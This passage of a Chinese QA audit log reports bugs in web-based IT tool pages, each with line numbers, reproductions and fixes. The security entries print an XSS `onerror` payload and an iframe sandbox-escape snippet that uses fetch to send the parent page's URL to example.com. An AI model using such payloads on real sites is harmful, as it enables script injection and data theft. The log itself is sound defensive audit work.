- 复现（node 复刻页内 `minify`，输入 → 实际）：
  - `.a::after{content:"a: b";}` → `.a::after{content:"a:b"}`（渲染文本由 `a: b` 变成 `a:b`）
  - `.a::after{content:"x; }";}` → `.a::after{content:"x}"}`（少了 `; `）
  - `.a::after{content:"A  B";}` → `.a::after{content:"A B"}`
  - `.a[title="a, b"]{color:red}` → `.a[title="a,b"]{color:red}`（属性选择器不再匹配原值）
  - 期望：字符串 / `url()` 内容原样保留，仅压缩字符串外空白。
- 影响：图标字、`content` 文案、属性选择器值会被改掉，且压缩结果看起来正常、只在上线后表现为文案或匹配错；对「压缩器」而言属输出错误而非样式问题。另 `:231` 的 `replace(/Infinity|NaN/g,'—')` 会把 CSS 里的 `.NaN` 选择器改写成 `.—`。
- 方案：先把 `"…"` / `'…'` / `url(…)` 用占位符替换，压缩完再还原（或写 tokenizer）；去掉对整段 HTML 的 NaN/Infinity 替换。
- 假工具：否

### IT-N432 短链页「复制」把「短链 + 原始 URL」拼在一起写入剪贴板（中，假功能）
- 页面：`tools/it/tiny-url.html`
- 问题：结果区同时渲染两行（`code-row` 短链、`原始 URL: …`，`:280`），`copyResult` 直接取 `#output` 的 `textContent`（`:295`）复制；两个 div 的文本没有分隔符，`textContent` 拼成 `短链原始 URL: 长链`。同时 `writeText(...).then(...)` 没有 `.catch`（`:296`），写入失败时静默无提示。
- 行号：`:280`、`:294-296`
- 复现：输入 `https://example.com/a?x=1`，生成后点「复制」→ 剪贴板实际内容 `https://tinyurl.com/AbC123原始 URL: https://example.com/a?x=1`；期望仅 `https://tinyurl.com/AbC123`。真机粘贴到聊天框即可复现。
- 影响：短链工具的核心动作产出不可直接使用的字符串，用户需手工截断；这也是该页唯一的「出站」路径。
- 方案：复制 `state` 里保存的短链（或单独 `#shortCode` 元素的文本），并对 `writeText` 补 `.catch` 提示。
- 假工具：否（页面已声明是「短链效果演示」，非真缩短服务）

### IT-N433 标准差的数据解析静默丢弃非数字项、并截断半数字符串，n 与结果随之失真（中，确认缺陷）
- 页面：`tools/it/standard-deviation.html`
- 问题：`parseData` 用 `parseFloat` + `isNaN` 过滤（`:256`），既不做整串校验也不报错：`abc` 之类整段被丢弃，`12abc` 被截成 `12`，`0x10` 被解析成 `0`；页面照常以「n=…」的确定口吻输出均值/方差/标准差。
- 行号：`:256`、`:258-262`、`:268`
- 复现（node 复刻页内 `parseData`/`calculate`）：
  - `1,2,3,abc` → 实际 `n=3`、`x̄=2`、`s=1`；期望提示「abc 不是有效数字」并拒绝计算（或明确列出被忽略项）。
  - `12abc, 3` → 实际按 `12, 3` 计算（s=6.364）；`0x10, 5` → 实际按 `0, 5` 计算（s=3.536）。
- 影响：从表格粘贴一列数据时，表头（如 `value`）会被无声吃掉，n 少 1、s 变化，而输出界面上没有任何异常信号，用户会误信结果。
- 方案：改用 `Number(s)` 并校验 `Number.isFinite`，非法 token 收集后提示；`12abc`、`0x10` 这类应报错而不是截断。
- 假工具：否

### IT-N434 CAA 生成器对域名不做任何校验，完整 URL / 含空格 / 大写域名都原样输出成「记录」（中，确认缺陷）
- 页面：`tools/it/caa-record-generator.html`
- 问题：`gen()` 只做 `trim()` 和去掉前导点（`:281`），随后直接把 `d` 拼进记录（`:297`），没有 hostname 合法性检查、没有小写归一、也不补结尾点；而 deep-dive 示例给的是带结尾点的 `example.com. CAA 0 issue "letsencrypt.org"`（`:181`），与输出格式不一致。
- 行号：`:281`、`:287-298`（核心 `:297`）、`:181`
- 复现：`domain=https://example.com`、勾选 Let's Encrypt → 实际输出 `https://example.com  CAA  0 issue "letsencrypt.org"`；期望拒绝并提示「请填写裸域名 example.com」。`domain=example com` → 输出 `example com  CAA …`；`Example.COM` → 保持大写不被归一。
- 影响：输出框被当作可直接粘贴的记录，非法 owner name 会被 DNS 服务商拒绝或写坏 zone；再者按 RFC 1035 主文件相对名规则，不带结尾点在 BIND zone 里会被拼上 `$ORIGIN`，指向错误的域名。
- 方案：`new URL`/正则校验 hostname（仅 `[a-z0-9.-]`、至少一个点、非 IP），统一小写，输出可选补 `.`。
- 假工具：否

### IT-N435 验证码「排除易混淆字符」在纯数字 / 纯字母模式下可见但代码未生效（中，承诺未实现）
- 页面：`tools/it/captcha-generator.html`
- 问题：`setType` 只在 `math`/`cn` 时隐藏该勾选框（`:921-924`），所以「纯数字」「纯字母」下勾选框仍然显示；但过滤逻辑只写在 `alnum` 分支（`:615-619`），`num` 分支死用 `0123456789`（`:588`），`alpha` 分支死用大小写字母表（`:596-604`），均未读 `state.excludeConfused`。默认预设「8个深色」还专门勾了这个选项（`:1081`）。
- 行号：`:344-346`、`:588-592`、`:596-604`、`:615-619`、`:921-924`、`:952-955`
- 复现：类型选「纯数字」+ 勾选「排除易混淆字符(0/O/o/I/l/1)」→ 实际仍生成如 `1010`、`0183`（含 0/1）；类型选「纯字母」+ 勾选 → 实际仍出现 `I`、`l`、`O`、`o`。期望结果中不含 `0OoIl1`。
- 影响：用户以为已规避易读错字符，实测仍出现，抄写验证码时按 0/O、1/l 混淆导致「验证失败」；对一个验证码示例工具而言等于选项无效。
- 方案：把过滤抽成公共函数对 `num`、`alpha`、`alnum` 的字符池统一应用（`num` 过滤后剩 8 位，需保证长度上限）。
- 假工具：否

### IT-N436 CSS 属性表把 `vertical-align` 登记了两条（不同分类、不同描述），统计与检索出现重复（中，确认缺陷）
- 页面：`tools/it/css-properties.html`
- 问题：`PROPERTIES` 里同名条目出现两次：`:379`（`cat:'文本'`，desc「垂直对齐」）与 `:454`（`cat:'表格'`，desc「表格垂直对齐」），其余字段仅 values 顺序不同。`renderProps` 不去重，`stats` 直接显示 `filtered.length`（`:493`）。
- 行号：`:379`、`:454`、`:482-493`（核心 `:493`）
- 复现：页面计数实际显示「共 133 个属性」（去重后为 132）；搜索框输入 `vertical-align` → 实际返回两张同名卡片，分别落在「文本」「表格」两个分类标签下，值为 `baseline, sub, super…` 与 `baseline, top, middle…`；期望只有一条，值表合并。
- 影响：属性总数与检索结果重复，且同一属性给出两套不同的取值顺序，用户会以为存在两个不同属性。
- 方案：删除 `:454` 那条（它落在「表格」分类，`vertical-align` 本就属文本/行内对齐），或在渲染前按 `name` 去重。
- 假工具：否

### 覆盖清单（V 批 IT 生成/校验/计算）
- `css-properties`：IT-N436（中）；无高优缺陷（属性值/初始值/继承性抽查未发现错误）。
- `meta-tags-generator`：IT-N428（高）、IT-N429、IT-N430（中）。
- `sqlite-cheatsheet`：无高优/中优缺陷（命令语法、`.mode`/JSON1/窗口函数示例与版本注记抽查正确；Chart/Table 双视图与检索联动正常）。
- `standard-deviation`：IT-N433（中）；无高优缺陷（sample/population 公式与 32/7≈4.57、s≈2.138 复算一致）。
- `tiny-url`：IT-N432（中）；无高优缺陷（随机短码生成与历史去重逻辑正常）。
- `css-minify`：IT-N431（高）。
- `caa-record-generator`：IT-N434（中）；无高优缺陷（CAA 记录语法、flag 128 关键位、iodef mailto 形式正确）。
- `captcha-generator`：IT-N435（中）；无高优缺陷（四种类型出题、数学答案校验、大小写归一逻辑正确）。
- 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数实算（`minify`、`parseData/calculate`、`PROPERTIES` 去重）并给出「输入 → 实际 / 期望」；**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。IT-N430 的引号未转义依据 HTML 文本节点序列化规则判定（`& < >` 转义、引号不转义），未做真机粘贴验证；两处 `</div`（缺 `>`，`meta-tags-generator.html:124`、`css-minify.html:127`）会吞掉紧随的 `<div class="toolbar">` 开标签，属结构/布局问题，未计入本批条目。

## V 批 · IT 编辑器/安全/编码（2026-11-04）

### IT-N437 源码应用与 HTML 导入直接写 `innerHTML`，事件属性在页面源执行（高，安全缺陷）
- 页面：`tools/it/rich-text-editor.html`
- 问题：`applySource()` 把源码框原文直接赋给 contenteditable 的 `innerHTML`（`:424`）；`loadFile()` 把导入文件内容同样直接赋值（`:548`）。两条路径都没有标签/属性白名单，`<img src=x onerror=…>` 之类的内联事件会在本页源执行。页内说明却写着「粘贴内容必须净化，输出 HTML 前必须过滤，否则极易引入 XSS」（`:124`）、FAQ「通常做净化防止 XSS」（`:249`）、标准表「输出净化」（`:273`），实际一处净化都没有（全文无 sanitize/DOMPurify 实现）。另外 `showResult` 把导入文件名直接拼进 `innerHTML`（`:550`）。
- 行号：`:424`、`:548`、`:550`（说明 `:124`、`:249`、`:273`）
- 复现：源码框粘贴 `<img src="x" onerror="alert(document.domain)">` → 点「✓ 应用到编辑区」→ 实际弹窗显示当前域名（图片加载失败即触发）；期望 `onerror` 被剥除或作为纯文本插入。导入文件名为 `<img src=x onerror=…>.html` 时，`:550` 同样执行。
- 影响：任何下载来的 HTML 模板/他人给的 `.html` 文件，导入后即可在本站源执行任意脚本，读写本站 localStorage、改写页面；用户把该工具当"本地编辑"用，不会预期导入即执行脚本。
- 方案：赋值前用 DOMPurify（或白名单清洗）过滤 `script/iframe/on*`；文件名用 `textContent` 拼接。
- 假工具：否

### IT-N438 有序列表导出 Markdown 时编号丢失，全部变成无序列表（中，功能缺口）
- 页面：`tools/it/rich-text-editor.html`
- 问题：`walk()` 对 `li` 一律输出 `'\n- '`（`:479`），`ul`/`ol` 只做内容透传（`:480`），不区分父标签、也不读 `start`/序号；公式 :119 虽写明"li 前加 `- `"，但结果是把有序列表的编号语义抹掉。
- 行号：`:479-480`
- 复现：编辑区写有序列表「1. 第一步 / 2. 第二步」→ 点「复制 Markdown」→ 实际 `- 第一步\n- 第二步`；期望 `1. 第一步\n2. 第二步`。
- 影响：粘贴到文档/README 后步骤编号消失，顺序语义丢失；页面 :291 只说"近似转换"，未提示有序列表会被降级。
- 方案：`walk` 传入父标签，`ol` 内的 `li` 用递增序号输出。
- 假工具：否

### IT-N439 `prettyHtml` 逐行 `trim`，代码块缩进经源码框往返后丢失（中，确认缺陷）
- 页面：`tools/it/rich-text-editor.html`
- 问题：`prettyHtml()` 在 `></` 处断行后对每一行 `.trim()`（`:406`），`syncSource()`/`syncToSource()`/`applySource()` 都以它为准（`:413`、`:416`、`:424`），因此 `<pre>` 内的行首缩进也被删掉。
- 行号：`:402-409`（核心 `:406`）、`:410-427`
- 复现：编辑区代码块 `<pre>function f(){\n  if (a) {\n    return 1;\n  }\n}</pre>` → 依次点「↻ 从编辑区刷新」「✓ 应用到编辑区」→ 实际 `<pre>function f(){\nif (a) {\nreturn 1;\n}\n}</pre>`（`node` 复刻 `prettyHtml` 输出 `"<pre>function f(){\nif (a) {\nreturn 1;\n}\n}</pre>"`）；期望缩进原样保留。
- 影响：代码块内容只要经过一次源码区往返就被破坏；Python/YAML/Makefile 等缩进敏感代码直接失效，而页面主打"代码块 + 往返编辑"。
- 方案：格式化时跳过 `<pre>`/`<code>` 内部内容，或只插换行不做 `trim`。
- 假工具：否

### IT-N440 「增强版/自动推断时间单位/容错」完全未实现，无分隔电码一律解成 `?`（高，假工具）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：标题与说明承诺「增强版」「自动推断时间单位，容忍多余空格、缺失分隔与轻微噪声」「把连续符号按长度阈值判为点或划，再按间隔长度切分字符与单词」（`:153-159`、`:219`、`:223`）；但 `dec()` 只有三步：按 `/\s*\/\s*|\s{2,}/` 切词、按单空格切字符、精确查表，未命中一律 `?`（`:316-327`），根本没有阈值/时长推断。`dec()` 也不处理一行内连续符号。
- 行号：`:316-327`（承诺 `:153-159`、`:219`、`:223`）
- 复现：输入 `...---...`（无分隔的 SOS）→ 实际 `?`（`node` 复刻 `dec` 同结果）；期望 `SOS`。`..- --- ...` 之类"轻微噪声"也无任何容错。
- 影响：以"增强版"为卖点的核心能力不存在，用户按宣传输入不规范电码只会得到 `?`；本质是精确查表版，属名不符实的假工具。
- 方案：要么真正实现自适应切分（文本输入需先约定点划时长），要么把标题/文案改成"精确查表版"并删掉容错承诺。
- 假工具：是

### IT-N441 「DIT DAH」样式的编码结果无法解码回原文（中，编码往返不一致）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：`styleCode()` 在 word 样式把每个码元用单空格连接（`:296`），而 `dec()` 把单空格当作字符分隔（`:321`），于是 `DIT DAH` 序列被逐个符号当成一个字符。
- 行号：`:296`、`:320-323`（核心 `:322`）
- 复现：输入 `SOS`、样式选 `DIT DAH` → 输出 `DIT DIT DIT DAH DAH DAH DIT DIT DIT`；原样点「解码」→ 实际 `EEETTTEEE`（`node` 复刻一致）；期望 `SOS`。
- 影响：三种样式里唯一带可读单词的样式产出不可逆结果，编码→解码闭环失效。
- 方案：word 样式用双空格/`/` 分隔字符，或在 `dec` 里先按双空格切字符、单空格切码元。
- 假工具：否

### IT-N442 `&`、`+`、`=` 与 prosign 共用同一码，解码被覆盖成 `<AS>`/`<AR>`/`<BT>`（中，确认缺陷）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：`REVERSE` 先由 `MORSE` 填充，随后 `PROSIGNS` 覆盖同名码（`:288-289`）；三组冲突：`&`/`<AS>`=`.-...`、`+`/`<AR>`=`.-.-.`、`=`/`<BT>`=`-...-`。
- 行号：`:280-281`、`:283-285`、`:288-289`
- 复现：编码 `&` → `.-...` → 再解码实际 `<AS>`；`+` → `<AR>`；`=` → `<BT>`（`node` 复刻）。期望还原原标点。
- 影响：任意包含 `& + =` 的电码解码后都变成 prosign，报文内容被改写，且没有任何提示。
- 方案：prosign 与字符码分开存放，解码按上下文/优先级判定，或编码时避开冲突表示。
- 假工具：否

### IT-N443 编码不支持 Prosigns 记号，`<AR>` 被拆成 `A R`（中，承诺未实现）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：说明称「含字母、数字、标点符号、Prosigns（特殊信号）」（`:162`），码表也列出 `<AA>`…`<SN>`（`:283-285`）；但 `enc()` 逐个单字符查 `MORSE`（`:307-311`），`<`、`>` 不在表中被静默丢弃，prosign 标记永远不会被识别。
- 行号：`:162`、`:283-285`、`:307-311`
- 复现：输入 `<AR>` → 实际 `.- .-.`（A R）；期望 `.-.-.`。`<SK>` → 实际 `... -.-`（S K），期望 `...-.-`。
- 影响：prosign 只能解不能编，宣传的字符集不成立；用户以为发出了"消息结束"，实际发了两个字母。
- 方案：`enc()` 先用 `/<[A-Z]{2}>/` 整体匹配 `PROSIGNS`，再逐字符编码。
- 假工具：否

### IT-N444 「倒序」按 UTF-16 码元反转，emoji/辅助平面字符被拆成无效代理项（中，编码往返不一致）
- 页面：`tools/it/string-obfuscator.html`
- 问题：`result=text.split('').reverse().join('')`（`:290`）按码元反转，代理对被打散。
- 行号：`:290`
- 复现：输入 `😀a` → 实际 `a\uDE00\uD83D`（`node` 实测 JSON 为 `"a\ude00\ud83d"`，渲染为 `a` + 乱码/替换符）；期望 `a😀`（`Array.from` 反转）。
- 影响：含 emoji、生僻字（辅助平面）的文本倒序后产生孤立代理项，输出不可读且不可还原。
- 方案：改为 `Array.from(text).reverse().join('')`。
- 假工具：否

### IT-N445 字符串内的 `/*` 被当作块注释起点，后续整段代码被吞为注释（高，确认缺陷）
- 页面：`tools/it/code-line-counter.html`
- 问题：`isInStr()` 定义于 `:292-301` 但全文无任何调用（grep 仅定义 1 处），块注释检测直接用 `t.indexOf('/*')`（`:325`），不区分字符串/模板字符串/正则。页面 :123 却明确承诺「字符串或正则字面量中出现的 `//`、`/*` 不应被误判为注释」。
- 行号：`:292-301`（死代码）、`:321-327`（核心 `:325`）
- 复现：JS 输入 `var re = "/*";` 换行 `var a = 1;` 换行 `var b = 2;` → 实际 总行 3 / 代码 0 / 注释 3 / 空 0、代码占比 `0.0%`（`node` 复刻）；期望 代码 2、注释 0、占比 `66.7%`。
- 影响：正则、URL、模板字符串里出现 `/*` 的代码会被整段吞为注释，代码行数与占比严重失真；这是统计工具的核心输出。
- 方案：扫描时维护字符串/模板字符串/正则状态机，在字符串内跳过 `/*`、`//`。
- 假工具：否

### IT-N446 块注释结束行被重复计数，默认示例四卡片之和大于总行数（高，确认缺陷）
- 页面：`tools/it/code-line-counter.html`
- 问题：`if(inBlock)` 分支先 `comment++`（`:317`），结束块注释后在 `:328` 又按最终判定再计一次；结束行若还带代码，则注释与代码各记一次。
- 行号：`:317`、`:328`
- 复现：页面默认示例（`:148-157`）→ 实际 总行 10 / 代码 4 / 注释 6 / 空行 1（合计 11 > 总行 10，注释应为 5，`node` 复刻 `{total:10,code:4,comment:6,blank:1,sum:11}`）；再如 `/* start` / ` middle` / `*/ const a = 1;` → 注释 3、代码 1，合计 4 > 总行 3。
- 影响：打开页面第一眼的数据就自相矛盾（注释率、代码占比随之失真），用户无法判断该信哪张卡片。
- 方案：结束行只在统一收口处计一次（删掉 `if(inBlock)` 内的 `comment++`，改记状态）。
- 假工具：否

### IT-N447 行中块注释被判为整行注释，行尾 `/* */` 使代码行漏计（中，确认缺陷）
- 页面：`tools/it/code-line-counter.html`
- 问题：块注释起点只要 `indexOf('/*')>=0` 就置 `isComment`（`:325`），不检查其前面是否有代码；而行注释只在行首匹配（`:319`），两者口径不一致。
- 行号：`:319`、`:321-327`
- 复现：JS 输入 `var x = 1; /* note */` 换行 `var y = 2;` → 实际 代码 1 / 注释 1（第一行算注释）；期望 代码 2 / 注释 0（或单列"含注释的代码行"）。
- 影响：常见的行尾块注释让代码行被少计，统计口径与主流工具（cloc/tokei）不一致。
- 方案：命中 `/*` 时若其前有非空代码，计为代码行；只有整行都是注释时才计注释行。
- 假工具：否

### IT-N448 高亮按行独立 tokenize，跨行块注释/三引号字符串/HTML 注释无法识别（中，确认缺陷）
- 页面：`tools/it/code-highlighter.html`
- 问题：`renderHighlighted()` 先 `code.split('\n')`，再对每行单独调用 `tokenize(line, lang)`（`:1346-1352`）；而 tokenize 的 `/* */`（`:944-951`）、Python `"""`/`'''`（`:952-959`）、HTML `<!-- -->`（`:1102-1108`）都只在单行内找结束符，跨行必然失配。页面公式却承诺识别块注释与三引号字符串（`:312`）。
- 行号：`:1345-1361`（核心 `:1352`）、`:944-951`、`:952-959`、`:1102-1108`
- 复现：JS 输入三行 `/* a` / ` b` / `*/` → 实际第 1 行注释色、第 2 行 `b` 普通色、第 3 行 `*/` 运算符色；期望三行整体注释色。Python 多行 docstring、HTML 多行注释同症状；模板字符串跨行也会被拆成多色。
- 影响：文档注释、多行字符串是最常见输入，高亮结果错色并被"复制高亮 HTML"原样带出。
- 方案：整段 tokenize 后再按 token 内部换行拆行渲染，或携带跨行状态。
- 假工具：否

### IT-N449 「复制高亮 HTML」不带 `.hl-*` 样式，粘贴到页面外全无颜色（中，确认缺陷）
- 页面：`tools/it/code-highlighter.html`
- 问题：`copyHighlightedHTML()` 只拼容器与 `td` 的内联样式（`:1447-1451`），没有导出 `.hl-keyword/.hl-string/.hl-comment…` 的颜色规则（这些规则只存在于本页 `<style>` 的 `:166-196`），复制结果里的 `<span class="hl-…">` 在目标文档中无任何样式。
- 行号：`:1433-1455`（核心 `:1447-1451`）、`:166-196`
- 复现：输入 `const a = 1;` → 点「🎨 高亮渲染」→「📋 复制高亮 HTML」→ 把剪贴板内容存成 `.html` 打开 → 实际只有黑色等宽文本与行号，关键字/字符串/注释全无颜色；期望保留着色。
- 影响：该按钮的唯一用途就是带走带色片段，产物在页面外不可用（结构、行号、字体正常，仅颜色全部丢失）。
- 方案：复制时把 `.hl-*` 规则（含浅/深主题色）内联成 `<style>` 前缀，或为每个 span 写行内 `style="color:…"`。
- 假工具：否

### IT-N450 Emoji 数据集重复 3 个字符，计数虚高且检索出现重复卡片（中，确认缺陷）
- 页面：`tools/it/emoji-picker.html`
- 问题：`EMOJI` 数组（`:209`）里 `💡`（idea/bulb）、`✈️`（airplane/plane）、`💬`（speech/comment）各出现两次，`calcTool()` 不去重，标题直接用 `list.length`（`:212`）。
- 行号：`:209`、`:211-212`
- 复现：留空搜索 → 实际「共 195 个 emoji」，去重后 192（`node` 读页内数组：total 195 / unique 192）；搜索 `灯`、`飞机` 各返回两张同字符卡片；期望 192 且每字符一张。
- 影响：计数口径错误，检索结果重复，用户以为存在不同表情；与"内置约 180 个"（`:169`）也对不上。
- 方案：构建/加载时按字符去重（保留首个），或删除重复条目。
- 假工具：否

### IT-N451 `sandbox` 同时开 `allow-scripts` 与 `allow-same-origin`，隔离失效且可外发数据（高，安全缺陷）
- 页面：`tools/it/code-runner.html`
- 问题：iframe 声明 `sandbox="allow-scripts allow-modals allow-same-origin"`（`:494`）。按 HTML 规范，`allow-scripts` + `allow-same-origin` 会让框架保留父页同源身份、脚本可访问父文档，沙箱形同虚设（浏览器会给出"可逃逸沙箱"告警）；父子页也确实依赖同源才能 `contentDocument` + `doc.write`（`:717-761`）。页面却称「交给隔离 iframe 执行」（`:401`）、「防止访问主页面 DOM、Cookie 与同源数据」（`:405`），FAQ 称「不能访问网络/文件，沙箱隔离，仅纯计算」（`:604`）。
- 行号：`:494`（承诺 `:401`、`:405`、`:601`、`:604`、`:623-629`）
- 复现：JS 面板输入 `parent.document.body.dataset.pwned='1'; parent.localStorage.setItem('tb','x'); fetch('https://example.com/x?d='+encodeURIComponent(parent.location.href))` 后运行 → 实际父页 DOM 被改、localStorage 被写、跨域请求已出站（受 CORS 影响但请求已发出）；期望 `parent.document` 抛 `SecurityError`、无网络请求。
- 影响：任何被粘贴或分享的代码片段都能读写本站 localStorage 并外发，或改写工具页 UI；"浏览器沙箱隔离"的安全承诺不成立（当前能力等同"同页预览器"）。
- 方案：去掉 `allow-same-origin`，改用 `srcdoc`/Blob URL 注入且父页不再直接访问 `contentDocument`（控制台仍经 postMessage），并声明"非安全沙箱"直至改完。
- 假工具：否

### IT-N452 用户 JS 里的字面量 `</script>` 提前闭合内联脚本，整段代码失效（中，确认缺陷）
- 页面：`tools/it/code-runner.html`
- 问题：`doc.write(... '<script>' + js + '<\/script>' ...)`（`:759`）把用户 JS 原样嵌入内联脚本，出现字面量 `</script>` 即提前结束脚本块，后续内容被当作 HTML。
- 行号：`:759`
- 复现：JS 输入 `console.log("</script>")` 后点运行 → 实际生成 `<script>console.log("` 被截断，控制台报语法错误、剩余代码变成页面文本；期望正常打印 `</script>`。
- 影响：演示 `document.write('<script src=x></script>')` 这类 HTML 字符串是常见需求，一写整段失效，且报错指向用户代码、掩盖真实原因。
- 方案：拼接前把 `js` 中的 `</script` 替换为 `<\/script`（或用 `srcdoc` 并转义）。
- 假工具：否

### IT-N453 用户代码无超时/终止机制，`while(true)` 直接冻结整个标签页（中，承诺未实现）
- 页面：`tools/it/code-runner.html`
- 问题：`executeInIframe()` 把用户 JS 直接写进同线程 iframe（`:758-759`），没有任何超时或终止；页面深解示例写「输出 `1024`（受超时与内存限制）」（`:601`），标准表写「限制 CPU 时间与内存，防止无限循环耗尽资源」（`:629`）。
- 行号：`:717-761`（核心 `:758-759`）、`:601`、`:629`
- 复现：JS 输入 `while(true){}` 后运行 → 实际整个标签页（含本页 UI）无响应，只能强杀标签；期望超时后终止并提示。
- 影响：死循环/长任务让工具页永久卡死，用户未保存代码丢失；与页面两处"受超时限制"的说法矛盾。
- 方案：用 Worker + `terminate()` 计时，或在执行前提示"无限循环会冻结页面"并删除超时承诺。
- 假工具：否

### IT-N454 忙等测试在事件派发前就占满主线程，`stopFlag` 永远不会置位、无法中途停止（中，确认缺陷）
- 页面：`tools/it/benchmark-builder.html`
- 问题：`run()` 在 `setTimeout(…,30)` 回调里同步 `while(!stopFlag && performance.now()-start<duration)` 忙等（`:291-303`，循环在 `:295`）；`stopFlag` 只在 `stopRun()`（`:283`）里置位，而 `stopRun()` 只能由「负载类型」select 的 change（`:123`）或预设按钮回调（`:369`、`:421`）触发——主线程被 `while` 占用期间事件无法派发，`stopFlag` 恒为 false；`:293` 定义的 `guard` 也从未被调用。
- 行号：`:123`、`:283`、`:284-313`（核心 `:295`）、`:293`
- 复现：时长选 5 秒 → 点「▶ 开始测试」→ 运行中切换负载类型/点击任何按钮 → 实际页面完全无响应约 5 秒、测试跑满全程；期望能中途停止并保留已完成部分。
- 影响：「可停止」的交互是死代码，任何一次测试都会冻结 UI；页面 :156 只提示"可能短暂卡顿"，未说明无法停止。
- 方案：改用 Worker 计时与停止，或把忙等切成 `setTimeout` 分片让出主线程。
- 假工具：否

### IT-N455 「复制测试代码」只给出空循环，忽略所选负载与时长，无法复现页面结果（中，假功能）
- 页面：`tools/it/benchmark-builder.html`
- 问题：`copyCode()` 生成的是写死模板（`:315-318`）：注释里只有类型名，循环体只有 `// 在此放入被测代码` + `ops++`，时长固定 `1000`ms，完全不读取 `#type` 的负载逻辑与 `#ms` 的时长。
- 行号：`:315-318`
- 复现：选「数组操作」+「5 秒」→ 点「复制测试代码」→ 实际得到 `while(performance.now()-start<1000){ // 在此放入被测代码\n ops++; }`，只测空循环开销，与所选负载无关；期望复制包含 `push`/`sort` 的对应负载并写入 5000ms。
- 影响：这是该页唯一可带走的产物，拿到的代码测不出页面上的负载，对比结果无意义。
- 方案：按 `type` 生成对应 workload 片段，并把 `ms` 注入循环条件。
- 假工具：否

### 覆盖清单（V 批 IT 编辑器/安全/编码）
- `rich-text-editor`：IT-N437（高，安全）；IT-N438、IT-N439（中）。
- `morse-decode-advanced`：IT-N440（高，假工具）；IT-N441、IT-N442、IT-N443（中）。
- `string-obfuscator`：IT-N444（中）；无高优缺陷（全角/ROT13/Base64/`\x` 十六进制/HTML 实体主路径往返核对正确，十六进制对 emoji 按 UTF-8 字节输出无截断）。
- `code-line-counter`：IT-N445、IT-N446（高）；IT-N447（中）。
- `code-highlighter`：IT-N448、IT-N449（中）；无高优缺陷（token 渲染统一走 `esc()`，`<`/`>`/`&`/`"` 已转义，未发现注入）。
- `emoji-picker`：IT-N450（中）；无高优缺陷（字符/中文关键词/英文名过滤逻辑本身正确，复制路径无注入）。
- `code-runner`：IT-N451（高，安全）；IT-N452、IT-N453（中）。
- `benchmark-builder`：IT-N454、IT-N455（中）；无高优缺陷（五种负载的循环体与吞吐公式本身可算，评级阈值仅为经验值）。
- 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数实算（`calcTool` 行数统计、`enc/dec`、`prettyHtml`、emoji 数组去重、`split('')` 反转）并给出「输入 → 实际 / 期望」；**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。IT-N437 的事件属性执行、IT-N451 的沙箱逃逸依据 HTML 规范（`innerHTML` 插入的 `onerror` 会触发；`allow-scripts` + `allow-same-origin` 不提供来源隔离）判定，未做真机复现。

## W 批 · IT URL/签名/安全（2026-11-04）

### IT-N456 二维码是哈希种子随机点阵，不含任何 QR 数据编码，扫码器无法解码（高，假工具）
- 页面：`tools/it/url-qr.html`
- 问题：`renderQR()` 只画三个定位图形与时序图案（`:249-258`），其余模块由 `pseudoRandom(strHash(text))` 逐格 `rnd()<0.5` 随机填充（`:260-265`）；没有数据位、格式信息、掩码与纠错码字，尺寸恒为 `N=29`（版本 3）。
- 行号：`:247-267`（核心 `:260`）、`:258`、`:269-273`、`:275-283`
- 复现：输入 `https://github.com` → 实际得到 29×29 的随机黑白点阵，系统相机/微信扫码均无任何内容；期望解码出该 URL。把输入换成任意字符串，点阵只有随机分布变化。
- 影响：页面标题、`description`（`:10`）与 `:191` 场景都承诺"生成二维码 / 扫码直达"，实际产出只是一张像二维码的装饰图，属假工具。
- 方案：接入真实 QR 编码库（如 qrcode-generator）按版本 + 纠错等级生成矩阵；在改完前须在页面标注"示意图，不可扫码"。
- 假工具：是

### IT-N457 描述承诺"可调尺寸与容错"，界面无任何尺寸 / 纠错控件（中，承诺未实现）
- 页面：`tools/it/url-qr.html`
- 问题：`<meta name="description">`（`:10`）与 og:description 写"可调尺寸与容错"，`formula-eq`（`:156`）按"纠错等级 M"说明，但表单只有网址输入（`:161`）；`renderQR` 固定 29×29，`drawQR` 固定 `cell=8`（`:248`、`:269`）。
- 行号：`:10`、`:156`、`:161`、`:248`、`:269`
- 复现：查找尺寸/纠错选项 → 实际不存在，输出恒为 232px、固定密度；期望能设尺寸与 L/M/Q/H。
- 影响：SERP 与分享卡片承诺的能力并不存在。
- 方案：补尺寸与纠错等级下拉并接入编码器，或从描述中删掉该承诺。
- 假工具：否

### IT-N458 空标题/描述仍输出 `content=""`，缺必填项也不告警（中，产出错误标签）
- 页面：`tools/it/og-meta-tag-generator.html`
- 问题：`formula-eq`（`:113`）明确写"有值字段才输出"，实际 `build()` 无条件输出 `og:title`/`og:description`/`twitter:title`/`twitter:description`（`:290-291`、`:300-301`），值为空时得到 `content=""`；缺图片/URL 时反而省略了必填的 `og:image`/`og:url`（`:292-293`），与 `:117` 的"必填四项"相悖，结果区仍按 `^<meta` 计数报"已生成 N 条"（`:304-305`）。
- 行号：`:113`、`:117`、`:288-305`（核心 `:290-291`、`:292-293`、`:304-305`）
- 复现：清空标题与描述、只填图片 URL → 实际输出含 4 条 `content=""` 的标签，并提示"已生成 6 条 meta 标签"；期望跳过空值，并提示 `og:image` / `og:url` 缺失。
- 影响：复制走的标签被各平台忽略（空 og:title 会直接退回抓取 `<title>`），用户却以为配置完成。
- 方案：空值不进 `L`；对 `og:title/type/image/url` 四项做缺失校验并在结果区标红。
- 假工具：否

### IT-N459 速查表把 4 个请求头当响应头收录，且 ETag / Last-Modified 各重复两条（中，参考结果错误）
- 页面：`tools/it/http-response-headers.html`
- 问题：`COMMANDS` 里混入请求头：`Range`（`:567`）、`Access-Control-Request-Method`（`:327`）、`Access-Control-Request-Headers`（`:335`）、`Want-Digest`（`:775`）；`ETag` 出现两次（`:439`、`:647`），`Last-Modified` 出现两次（`:447`、`:655`）。
- 行号：`:327`、`:335`、`:439`、`:447`、`:567`、`:647`、`:655`、`:775`
